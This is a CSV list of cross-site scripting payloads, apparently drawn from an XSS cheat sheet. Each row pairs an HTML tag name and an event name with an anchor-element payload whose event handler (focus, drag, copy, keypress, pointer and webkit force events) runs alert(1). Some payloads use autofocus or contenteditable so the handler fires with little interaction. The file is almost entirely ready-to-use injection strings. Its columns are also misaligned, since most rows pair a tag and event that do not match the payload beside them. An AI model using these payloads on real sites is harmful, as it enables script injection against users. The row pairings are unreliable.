tag,event,payload,,
a,onafterprint,<a autofocus onfocus=alert(1) href></a>,,
a2,onafterscriptexecute,<a autofocus onfocusin=alert(1) href></a>,,
abbr,onanimationcancel,<a contenteditable onbeforeinput=alert(1)>test,,
acronym,onanimationend,"<a draggable=""true"" ondrag=""alert(1)"" style=display:block>test</a>",,
address,onanimationiteration,"<a draggable=""true"" ondragend=""alert(1)"" style=display:block>test</a>",,
animate,onanimationstart,"<a draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</a>",,
animatemotion,onauxclick,"<a draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</a>",,
animatetransform,onbeforecopy,"<a draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</a>",,
applet,onbeforecut,"<a draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</a>",,
area,onbeforeinput,"<a id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></a>",,
article,onbeforeprint,<a id=x tabindex=1 onfocus=alert(1)></a>,,
aside,onbeforescriptexecute,<a id=x tabindex=1 onfocusin=alert(1)></a>,,
audio,onbeforetoggle,<a onafterscriptexecute=alert(1)><script>1</script>,,
audio2,onbeforeunload,"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",,
b,onbegin,"<a onbeforecut=""alert(1)"" contenteditable>test</a>",,
bdi,onblur,<a onbeforescriptexecute=alert(1)><script>1</script>,,
bdo,oncanplay,<a onblur=alert(1) id=x tabindex=1 style=display:block>test</a><input value=clickme>,,
big,oncanplaythrough,"<a onclick=""alert(1)"" style=display:block>test</a>",,
blink,onchange,"<a oncontextmenu=""alert(1)"" style=display:block>test</a>",,
blockquote,onclick,"<a oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
body,onclose,"<a oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
br,oncontextmenu,"<a ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</a>",,
button,oncopy,<a onfocus=alert(1) autofocus tabindex=1>,,
canvas,oncuechange,<a onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</a><input value=clickme>,,
caption,oncut,"<a onkeydown=""alert(1)"" contenteditable style=display:block>test</a>",,
center,ondblclick,"<a onkeypress=""alert(1)"" contenteditable style=display:block>test</a>",,
cite,ondrag,"<a onkeyup=""alert(1)"" contenteditable style=display:block>test</a>",,
code,ondragend,"<a onmousedown=""alert(1)"" style=display:block>test</a>",,
col,ondragenter,"<a onmouseenter=""alert(1)"" style=display:block>test</a>",,
colgroup,ondragexit,"<a onmouseleave=""alert(1)"" style=display:block>test</a>",,
command,ondragleave,"<a onmousemove=""alert(1)"" style=display:block>test</a>",,
content,ondragover,"<a onmouseout=""alert(1)"" style=display:block>test</a>",,
custom tags,ondragstart,"<a onmouseover=""alert(1)"" style=display:block>test</a>",,
data,ondrop,"<a onmouseup=""alert(1)"" style=display:block>test</a>",,
datalist,ondurationchange,<a onmousewheel=alert(1) style=display:block>requires scrolling,,
dd,onend,"<a onpaste=""alert(1)"" contenteditable>test</a>",,
del,onended,<a onpointercancel=alert(1)>XSS</a>,,
details,onerror,<a onpointerdown=alert(1) style=display:block>XSS</a>,,
dfn,onfocus,<a onpointerenter=alert(1) style=display:block>XSS</a>,,
dialog,onfocus(autofocus),<a onpointerleave=alert(1) style=display:block>XSS</a>,,
dir,onfocusin,<a onpointermove=alert(1) style=display:block>XSS</a>,,
div,onfocusout,<a onpointerout=alert(1) style=display:block>XSS</a>,,
dl,onformdata,<a onpointerover=alert(1) style=display:block>XSS</a>,,
dt,onfullscreenchange,<a onpointerrawupdate=alert(1) style=display:block>XSS</a>,,
element,onhashchange,<a onpointerup=alert(1) style=display:block>XSS</a>,,
em,oninput,"<a onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></a>",,
embed,oninvalid,<a onwebkitmouseforcechanged=alert(1)>XSS</a>,,
fieldset,onkeydown,<a onwebkitmouseforcedown=alert(1)>XSS</a>,,
figcaption,onkeypress,<a onwebkitmouseforceup=alert(1)>XSS</a>,,
figure,onkeyup,<a onwebkitmouseforcewillbegin=alert(1)>XSS</a>,,
font,onload,<a onwebkitwillrevealbottom=alert(1)>XSS</a>,,
footer,onloadeddata,<a2 contenteditable onbeforeinput=alert(1)>test,,
